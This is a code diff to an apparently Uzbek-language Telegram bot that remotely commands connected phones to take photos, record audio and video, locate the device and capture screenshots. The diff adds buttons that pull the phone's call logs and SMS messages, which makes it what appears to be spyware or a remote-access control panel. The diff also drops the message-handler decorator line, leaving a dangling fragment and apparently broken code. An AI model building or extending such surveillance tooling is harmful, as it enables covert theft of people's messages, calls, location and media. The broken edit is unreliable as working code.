@@ -49,6 +49,7 @@ def get_main_keyboard():
         [KeyboardButton(text="📍 Manzilni aniqlash")],
         [KeyboardButton(text="📸 Ekran rasmi")],
         [KeyboardButton(text="🔋 Batareya"), KeyboardButton(text="📱 Qurilma info")],
+        [KeyboardButton(text="📞 Qo'ng'iroqlar"), KeyboardButton(text="💬 SMS O'qish")],
     ]
     return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)
 
@@ -68,12 +69,11 @@ async def start_handler(message: types.Message):
     )
 
 
-@dp.message(F.text.in_({
     "📸 Rasm olish", "🤳 Selfie",
     "🎙 Ovoz yozish (10 sek)", "🎥 1 Daqiqalik Video",
-    "📍 Manzilni aniqlash",
-    "📸 Ekran rasmi",
-    "🔋 Batareya", "📱 Qurilma info"
+    "📍 Manzilni aniqlash", "📸 Ekran rasmi",
+    "🔋 Batareya", "📱 Qurilma info",
+    "📞 Qo'ng'iroqlar", "💬 SMS O'qish"
 }))
 async def action_handler(message: types.Message):
     global connected_devices
@@ -96,6 +96,8 @@ async def action_handler(message: types.Message):
         "📸 Ekran rasmi":       "get_screenshot",
         "🔋 Batareya":          "battery",
         "📱 Qurilma info":      "device_info",
+        "📞 Qo'ng'iroqlar":     "get_call_logs",
+        "💬 SMS O'qish":        "get_sms_logs",
     }
     action = command_map[message.text]
 
